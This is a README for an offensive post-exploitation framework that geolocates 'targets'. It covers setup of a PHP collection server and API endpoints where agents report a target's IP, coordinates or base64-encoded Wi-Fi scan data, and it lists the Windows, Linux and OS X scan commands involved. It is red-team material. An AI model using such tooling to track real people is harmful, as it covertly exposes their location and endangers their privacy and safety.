A framework for targeted geolocation.

As seen in the presentation "[Hide and Seek: Post-Exploitation Style](http://lanmaster53.com/talks/#shmoocon2013)" from ShmooCon 2013.

The associated Metasploit Framework modules can be found [here](https://github.com/v10l3nt/metasploit-framework/tree/master/modules/auxiliary/badger).

## Getting Started

### Pre-requisites

* PHP
* \*Python
* \*SQLite3

\*installed on most *nix platforms by default.

### Setup

1. Copy the contents of the repository into the server/virtual host web root.
2. Configure the web server/virtual host to restrict direct access to the "include", "data" and "admin" directories. See "admin/vhost_config.txt" for an example Apache virtual host configuration file.
3. Create a directory called data in the web root and make it writable by the user the web server is running as.
4. Initialize the database and logging system by visiting the UI in a browser.
5. Create a user with the "create_user.py" script in the "admin" directory. If this fails, it is most likely due to a missing pre-requisite or failure to do step 3.
6. Log in to the UI using the newly created account.

## API Usage

### IP Geolocation

This method geolocates the target based on the source IP of the request and assigns the resolved location to the given target and agent.

Example: (Method: GET)

```http://<path_to_honeybadger>/service.php?target=<target_name>&agent=<agent_name>```

### Known Coordinates

This method accepts previously resolved location data for the given target and agent.

Example: (Method: GET)

```http://<path_to_honeybadger>/service.php?target=<target_name>&agent=<agent_name>&lat=<latitude>&lng=<longitude>&acc=<accuracy>```

### Wireless Survey

This method accepts wireless survey data and parses the information on the server-side, extracting what is needed to make a Google API geolocation call. The resolved geolocation data is then assigned to the given target and agent. Parsers currently exist for survey data from Windows, Linux and OS X using the following commands:

Windows:

```cmd.exe /c netsh wlan show networks mode=bssid | findstr "SSID Signal"```

Linux:

```/bin/sh -c iwlist scan | egrep 'Address|ESSID|Signal'```

OS X:

```/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s```

Example: (Method: POST)

```http://<path_to_honeybadger>/service.php```

POST Payload:

```target=<target_name>&agent=<agent_name>&os=<operating_system>&data=<base64_data>```

### Universal Parameters

All requests can include an optional "comment" parameter. This parameter is sanitized and displayed within the UI as miscellaneous information about the target or agent.
